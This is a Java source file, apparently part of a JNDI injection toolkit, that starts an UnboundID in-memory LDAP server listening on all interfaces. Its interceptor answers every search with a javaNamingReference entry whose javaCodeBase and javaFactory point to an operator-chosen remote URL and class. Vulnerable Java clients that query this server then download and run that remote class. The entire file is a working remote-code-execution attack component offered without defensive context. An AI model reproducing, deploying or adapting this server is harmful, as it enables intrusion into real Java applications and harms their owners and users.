package com.minshenyao;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class LdapService {
    private static final Logger LOGGER = Logger.getLogger(LdapService.class.getName());
    private static final String LDAP_BASE = "dc=example,dc=com";
    private static InMemoryDirectoryServer directoryServer;
    private static final AtomicBoolean running = new AtomicBoolean(false);

    public static synchronized void startLdapService(String codebaseUrl, int port) {
        if (running.compareAndSet(false, true)) {
            try {
                URL url = new URL(codebaseUrl);
                InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
                config.setListenerConfigs(new InMemoryListenerConfig(
                        "listen",
                        InetAddress.getByName("0.0.0.0"),
                        port,
                        ServerSocketFactory.getDefault(),
                        SocketFactory.getDefault(),
                        (SSLSocketFactory) SSLSocketFactory.getDefault()));

                config.addInMemoryOperationInterceptor(new OperationInterceptor(url));
                directoryServer = new InMemoryDirectoryServer(config);
                directoryServer.startListening();
                LOGGER.info("LDAP 服务已启动，监听在 0.0.0.0: " + port);
            } catch (Exception e) {
                running.set(false);
                LOGGER.log(Level.SEVERE, "启动 LDAP 服务失败", e);
                throw new RuntimeException("无法启动 LDAP 服务", e);
            }
        } else {
            LOGGER.warning("LDAP 服务已在运行");
        }
    }

    public static synchronized void stopLdapService() {
        if (running.compareAndSet(true, false)) {
            if (directoryServer != null) {
                directoryServer.shutDown(true);
                directoryServer = null;
                LOGGER.info("LDAP 服务已停止");
            }
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private final URL codebase;

        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry entry = new Entry(base);
            try {
                sendResult(result, base, entry);
            } catch (Exception e) {
                LOGGER.log(Level.WARNING, "处理搜索结果时出错", e);
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException, MalformedURLException {
            URL redirectUrl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            LOGGER.info("发送 LDAP 引用结果，重定向到: " + redirectUrl);

            entry.addAttribute("javaClassName", "foo");

            String cbString = this.codebase.toString();
            int refPos = cbString.indexOf('#');
            if (refPos > 0) {
                cbString = cbString.substring(0, refPos);
            }

            entry.addAttribute("javaCodeBase", cbString);
            entry.addAttribute("objectClass", "javaNamingReference");
            entry.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
